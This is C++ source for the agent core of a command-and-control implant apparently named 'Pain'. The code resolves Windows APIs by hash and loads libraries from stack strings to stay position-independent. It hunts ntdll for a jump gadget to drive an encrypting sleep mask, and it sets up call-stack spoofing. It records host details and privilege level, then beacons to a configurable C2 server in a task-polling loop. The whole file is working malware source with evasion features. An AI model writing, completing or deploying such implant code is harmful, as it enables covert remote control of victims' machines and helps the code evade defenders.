#include <windows.h>
#include <Native.h>
#include <Agent.h>
#include <Defines.h>
#include <Hash.h>
#include <LdrLoad.h>
#include <Internals.h>
#include <Spoof.h>

// C2 build config defaults - override via: make PAIN_C2_HOST='"10.0.0.1"' PAIN_C2_PORT=443
#ifndef PAIN_C2_HOST
#define PAIN_C2_HOST "127.0.0.1"
#endif
#ifndef PAIN_C2_PORT
#define PAIN_C2_PORT 8080
#endif
#ifndef PAIN_SLEEP
#define PAIN_SLEEP 5
#endif
#ifndef PAIN_JITTER
#define PAIN_JITTER 0
#endif
#ifndef PAIN_C2_SSL
#define PAIN_C2_SSL 0
#endif
#ifndef PAIN_AUTH_MODE
#define PAIN_AUTH_MODE 0
#endif
#ifndef PAIN_AUTH_KEY
#define PAIN_AUTH_KEY "00000000000000000000000000000000"
#endif
// UUID is generated at runtime - no compile-time define needed
#ifndef PAIN_USER_AGENT
#define PAIN_USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
#endif

// forward declaration for Transport_Checkin (Transport.cc)
DECLFN BOOL Transport_Checkin();

extern "C" ULONG_PTR EndPtr();

DECLFN Root::Agent::Agent()
{
    Base.Start = StartPtr();
    Base.Length = EndPtr() - Base.Start;

    // find ntdll and resolve all its function pointer
    Ntdll.Handle = LdrLoad::Module( Hash::Str( L"ntdll.dll" ) );
    if ( !Ntdll.Handle ) return;
    RSL_IMP( Ntdll );

    // EndPtr lands on the first page AFTER real code; the PE image may pad one more
    // alignment page beyond that, causing VirtualProtect to split the region.
    // Query the actual region size now (before any VirtualProtect splits it) so sleep
    // mask covers the full allocation.
    {
        MEMORY_BASIC_INFORMATION mbi = {};
        NTSTATUS st = Ntdll.NtQueryVirtualMemory( (HANDLE)-1, (PVOID)Base.Start,
                          0, &mbi, sizeof(mbi), nullptr );
        if ( NT_SUCCESS(st) ) {
            ULONG_PTR full = (ULONG_PTR)mbi.BaseAddress + (ULONG_PTR)mbi.RegionSize - Base.Start;
            if ( full > Base.Length ) Base.Length = full;
        }
    }

    // find kernel32 and resolve all its function pointer
    Krnl32.Handle = LdrLoad::Module( Hash::Str( L"kernel32.dll" ) );
    if ( !Krnl32.Handle ) return;
    RSL_IMP( Krnl32 );
    
}

DECLFN void Root::Agent::Init()
{
    G_AGENT;
    Self->Ntdll.DbgPrint( "[Pain] Init() start\n" );

    PAIN_PEB* peb = NtCurrentPeb();
    auto* params  = (RTL_USER_PROCESS_PARAMETERS*)peb->ProcessParameters;
    Self->Session.ProcessID   = (ULONG)(ULONG_PTR)NtCurrentTeb()->ClientId.UniqueProcess;
    Self->Session.ThreadID    = (ULONG)(ULONG_PTR)NtCurrentTeb()->ClientId.UniqueThread;
    Self->Session.ImagePath   = (PCHAR)params->ImagePathName.Buffer;
    Self->Session.CommandLine = (PCHAR)params->CommandLine.Buffer;
    Self->Ntdll.DbgPrint( "[Pain] PID: %d TID: %d\n", Self->Session.ProcessID, Self->Session.ThreadID );

    // Extract process name: last backslash-separated component of ImagePathName (WCHAR → ANSI)
    {
        USHORT  wlen  = params->ImagePathName.Length / sizeof(WCHAR);
        PWCHAR  wbuf  = params->ImagePathName.Buffer;

        INT32 sep = -1;
        for ( USHORT i = 0; i < wlen; i++ )
            if ( wbuf[i] == L'\\' || wbuf[i] == L'/' ) sep = (INT32)i;

        PWCHAR name_w = wbuf + sep + 1;
        UINT32 name_n = (UINT32)(wlen - (sep + 1));

        if ( name_n > 0 ) {
            Self->Machine.ProcessName = (PCHAR)Heap_Alloc( name_n + 1 );
            if ( Self->Machine.ProcessName ) {
                for ( UINT32 i = 0; i < name_n; i++ )
                    Self->Machine.ProcessName[i] = (CHAR)(BYTE)name_w[i];
                Self->Machine.ProcessName[ name_n ] = '\0';
            }
        }
        Self->Ntdll.DbgPrint( "[Pain] ProcessName: %s\n", Self->Machine.ProcessName ? Self->Machine.ProcessName : "NULL" );
    }

    // load advapi32 - not pre-loaded by the minimal test loader, must use LoadLibraryA
    CHAR adv_name[] = { 'a','d','v','a','p','i','3','2','.','d','l','l',0 };
    Self->Advapi32.Handle = (ULONG_PTR)Self->Krnl32.LoadLibraryA( adv_name );
    Self->Ntdll.DbgPrint( "[Pain] Advapi32.Handle = 0x%p\n", (PVOID)Self->Advapi32.Handle );
    if ( Self->Advapi32.Handle ) RSL_IMP( Self->Advapi32 );

    // load wininet - stack char array avoids G_SYM dependency
    CHAR win_name[] = { 'w','i','n','i','n','e','t','.','d','l','l',0 };
    Self->WinInet.Handle = (ULONG_PTR)Self->Krnl32.LoadLibraryA( win_name );
    Self->Ntdll.DbgPrint( "[Pain] WinInet.Handle = 0x%p\n", (PVOID)Self->WinInet.Handle );
    if ( Self->WinInet.Handle ) RSL_IMP( Self->WinInet );

    // load cryptbase - provides SystemFunction040/041 (RtlEncryptMemory/RtlDecryptMemory)
    // used by sleep mask to encrypt the .text section in place without a caller key
    CHAR crypt_name[] = { 'c','r','y','p','t','b','a','s','e','.','d','l','l',0 };
    Self->Cryptbase.Handle = (ULONG_PTR)Self->Krnl32.LoadLibraryA( crypt_name );
    Self->Ntdll.DbgPrint( "[Pain] Cryptbase.Handle = 0x%p\n", (PVOID)Self->Cryptbase.Handle );
    if ( Self->Cryptbase.Handle ) RSL_IMP( Self->Cryptbase );

    // find jmp [rbx] gadget (FF 23) inside ntdll .text for the timer chain
    // the gadget lets NtContinue-driven callbacks call arbitrary APIs with 4-register args
    {
        PBYTE  ntdll  = (PBYTE)Self->Ntdll.Handle;
        auto*  dos    = (IMAGE_DOS_HEADER*)ntdll;
        auto*  nth    = (IMAGE_NT_HEADERS64*)(ntdll + dos->e_lfanew);
        auto*  sec    = (IMAGE_SECTION_HEADER*)((PBYTE)&nth->OptionalHeader + nth->FileHeader.SizeOfOptionalHeader);

        for ( WORD i = 0; i < nth->FileHeader.NumberOfSections; i++, sec++ ) {
            if ( !(sec->Characteristics & IMAGE_SCN_CNT_CODE) ) continue;
            PBYTE start = ntdll + sec->VirtualAddress;
            PBYTE end   = start + sec->Misc.VirtualSize - 1;
            for ( PBYTE p = start; p < end; p++ ) {
                if ( p[0] == 0xFF && p[1] == 0x23 ) {   // jmp [rbx]
                    Self->Config.JmpGadget = p;
                    break;
                }
            }
            if ( Self->Config.JmpGadget ) break;
        }
    }
    Self->Ntdll.DbgPrint( "[Pain] JmpGadget = 0x%p\n", Self->Config.JmpGadget );

    // duplicate the main thread handle - GetCurrentThread() returns a pseudo-handle (-2)
    // that is only valid in the calling thread; DuplicateHandle gives us a real handle
    // usable by timer pool threads for NtGetContextThread/NtSetContextThread
    Self->Krnl32.DuplicateHandle(
        (HANDLE)(LONG_PTR)-1,   // source process = current
        (HANDLE)(LONG_PTR)-2,   // source thread  = current (pseudo)
        (HANDLE)(LONG_PTR)-1,   // target process = current
        &Self->Config.MainThreadHandle,
        THREAD_ALL_ACCESS, FALSE, 0 );
    Self->Ntdll.DbgPrint( "[Pain] MainThreadHandle = 0x%p\n", Self->Config.MainThreadHandle );

    // config - stack char arrays are PIC-safe (compiler emits byte-by-byte stack init, no .rdata pointer)
    // G_SYM is unreliable here (StartPtr() returns wrong value), so we use #define values directly
    CHAR host_str[] = PAIN_C2_HOST;
    CHAR ua_str[]   = PAIN_USER_AGENT;

    UINT32 host_len = 0; while ( host_str[host_len] ) host_len++;
    UINT32 ua_len   = 0; while ( ua_str[ua_len]     ) ua_len++;

    Self->Config.Host      = (PCHAR)Heap_Alloc( host_len + 1 );
    Self->Config.UserAgent = (PCHAR)Heap_Alloc( ua_len   + 1 );

    if ( Self->Config.Host )      Mem_Copy( Self->Config.Host,      host_str, host_len );
    if ( Self->Config.UserAgent ) Mem_Copy( Self->Config.UserAgent, ua_str,   ua_len   );

    // Runtime UUID from ASLR entropy - pure 32-bit arithmetic, no large constants.
    {
        ULONG pid  = Self->Session.ProcessID;
        ULONG tid  = Self->Session.ThreadID;
        ULONG stk  = (ULONG)(ULONG_PTR)Self->Config.Host;
        ULONG base = (ULONG)(ULONG_PTR)Self->Base.Start;

        // ROT: 32-bit left-rotate by compile-time constant n (no UB: n in 1..31)
        #define ROT(v, n) (((ULONG)(v) << (n)) | ((ULONG)(v) >> (32 - (n))))

        // Each output word XORs two rotated sources so a 1-bit change in any input
        // changes bits across multiple UUID bytes.
        ULONG a = pid  ^ ROT(base, 11);
        ULONG b = tid  ^ ROT(stk,  17);
        ULONG c = ROT(pid,  7) ^ stk;
        ULONG d = ROT(tid, 13) ^ base;

        #undef ROT

        BYTE rnd[16];
        Mem_Copy( rnd + 0,  &a, 4 );
        Mem_Copy( rnd + 4,  &b, 4 );
        Mem_Copy( rnd + 8,  &c, 4 );
        Mem_Copy( rnd + 12, &d, 4 );

        // RFC 4122 version 4 / variant 1 marker bits
        rnd[6] = ( rnd[6] & 0x0F ) | 0x40;
        rnd[8] = ( rnd[8] & 0x3F ) | 0x80;

        // hex table as stack array - PIC-safe (no .rdata pointer)
        CHAR hx[] = { '0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f' };

        Self->Config.AgentUUID = (PCHAR)Heap_Alloc( 37 );
        if ( Self->Config.AgentUUID ) {
            PCHAR p = Self->Config.AgentUUID;
            for ( int i = 0;  i < 4;  i++ ) { *p++ = hx[rnd[i]>>4]; *p++ = hx[rnd[i]&0xF]; } *p++ = '-';
            for ( int i = 4;  i < 6;  i++ ) { *p++ = hx[rnd[i]>>4]; *p++ = hx[rnd[i]&0xF]; } *p++ = '-';
            for ( int i = 6;  i < 8;  i++ ) { *p++ = hx[rnd[i]>>4]; *p++ = hx[rnd[i]&0xF]; } *p++ = '-';
            for ( int i = 8;  i < 10; i++ ) { *p++ = hx[rnd[i]>>4]; *p++ = hx[rnd[i]&0xF]; } *p++ = '-';
            for ( int i = 10; i < 16; i++ ) { *p++ = hx[rnd[i]>>4]; *p++ = hx[rnd[i]&0xF]; }
            *p = '\0';
        }
        Self->Ntdll.DbgPrint( "[Pain] UUID: %s\n", Self->Config.AgentUUID );
    }

    Self->Config.Port     = PAIN_C2_PORT;
    Self->Config.Sleep    = PAIN_SLEEP;
    Self->Config.Jitter   = PAIN_JITTER;
    Self->Config.Ssl      = PAIN_C2_SSL;
    Self->Config.AuthMode = PAIN_AUTH_MODE;

#if PAIN_AUTH_MODE != 0
    {
        // Decode 32-char hex string PAIN_AUTH_KEY into 16 raw bytes.
        // Stack char array is PIC-safe - no .rdata reference.
        CHAR hex_key[] = PAIN_AUTH_KEY;
        Self->Config.AuthKey = (PBYTE)Heap_Alloc( 16 );
        if ( Self->Config.AuthKey ) {
            for ( int i = 0; i < 16; i++ ) {
                CHAR hi = hex_key[ i * 2     ];
                CHAR lo = hex_key[ i * 2 + 1 ];
                BYTE hv = ( hi >= 'a' ) ? (BYTE)(hi - 'a' + 10) : (BYTE)(hi - '0');
                BYTE lv = ( lo >= 'a' ) ? (BYTE)(lo - 'a' + 10) : (BYTE)(lo - '0');
                Self->Config.AuthKey[i] = ( hv << 4 ) | lv;
            }
        }
        Self->Ntdll.DbgPrint( "[Pain] AuthMode=%d AuthKey[0]=0x%02x\n",
                              (int)Self->Config.AuthMode,
                              Self->Config.AuthKey ? Self->Config.AuthKey[0] : 0 );
    }
#endif

    Self->Ntdll.DbgPrint( "[Pain] Config: Host=%s Port=%d\n", Self->Config.Host, Self->Config.Port );

    CHAR  comp_buf[256]; Mem_Set( comp_buf, 0, sizeof(comp_buf) ); DWORD comp_len = sizeof(comp_buf);
    if ( Self->Krnl32.GetComputerNameA( comp_buf, &comp_len ) ) {
        Self->Machine.Computer = (PCHAR)Heap_Alloc( comp_len + 1 );
        if ( Self->Machine.Computer ) Mem_Copy( Self->Machine.Computer, comp_buf, comp_len );
    }
    Self->Ntdll.DbgPrint( "[Pain] Computer=%s\n", Self->Machine.Computer ? Self->Machine.Computer : "NULL" );

    CHAR  user_buf[256]; Mem_Set( user_buf, 0, sizeof(user_buf) ); DWORD user_len = sizeof(user_buf);
    if ( Self->Advapi32.Handle && Self->Advapi32.GetUserNameA( user_buf, &user_len ) ) {
        Self->Machine.Username = (PCHAR)Heap_Alloc( user_len + 1 );
        if ( Self->Machine.Username ) Mem_Copy( Self->Machine.Username, user_buf, user_len );
    }
    Self->Ntdll.DbgPrint( "[Pain] Username=%s\n", Self->Machine.Username ? Self->Machine.Username : "NULL" );

    RTL_OSVERSIONINFOW osinfo;
    Mem_Set( &osinfo, 0, sizeof(osinfo) );
    osinfo.dwOSVersionInfoSize = sizeof(osinfo);
    if ( NT_SUCCESS( Self->Ntdll.RtlGetVersion( &osinfo ) ) ) {
        Self->Machine.OsMajor = osinfo.dwMajorVersion;
        Self->Machine.OsMinor = osinfo.dwMinorVersion;
        Self->Machine.OsBuild = osinfo.dwBuildNumber;
    }
    Self->Ntdll.DbgPrint( "[Pain] OS: %d.%d.%d\n", Self->Machine.OsMajor, Self->Machine.OsMinor, Self->Machine.OsBuild );

    // Check token elevation: TokenElevation (20) returns a DWORD; non-zero = elevated
    {
        HANDLE token = nullptr;
        Self->Machine.Elevated = FALSE;
        if ( Self->Advapi32.Handle &&
             Self->Advapi32.OpenProcessToken( (HANDLE)(LONG_PTR)-1, TOKEN_QUERY, &token ) ) {
            struct { DWORD IsElevated; } elev = { 0 };
            DWORD returned = 0;
            if ( Self->Advapi32.GetTokenInformation( token, TokenElevation,
                                                     &elev, sizeof(elev), &returned ) )
                Self->Machine.Elevated = ( elev.IsElevated != 0 );
            Self->Ntdll.NtClose( token );
        }
        Self->Ntdll.DbgPrint( "[Pain] Elevated: %d\n", (int)Self->Machine.Elevated );
    }

    // initialise live call-stack spoofing (requires Ntdll + Krnl32 resolved above)
#if PAIN_STACK_SPOOF
    Spoof_Init();
#endif

    // Parse malleable profile blob; sets Self->Config.Callbacks[] when count > 0
    Malleable_Init();

    Self->Ntdll.DbgPrint( "[Pain] Init() done\n" );
}


DECLFN void Root::Agent::Start()
{
    G_AGENT;
    Transport_Checkin();

    while ( TRUE )
    {
        PVOID  task_buf  = nullptr;
        UINT32 task_len  = 0;

        if ( Transport_Poll( &task_buf, &task_len ) )
        {
            if ( task_buf && task_len > 0 )
            {
                Task_Dispatch( task_buf, task_len );
                Heap_Free( task_buf );
            }
        }

        Beacon_Sleep( Self->Config.Sleep * 1000 );
    }
}
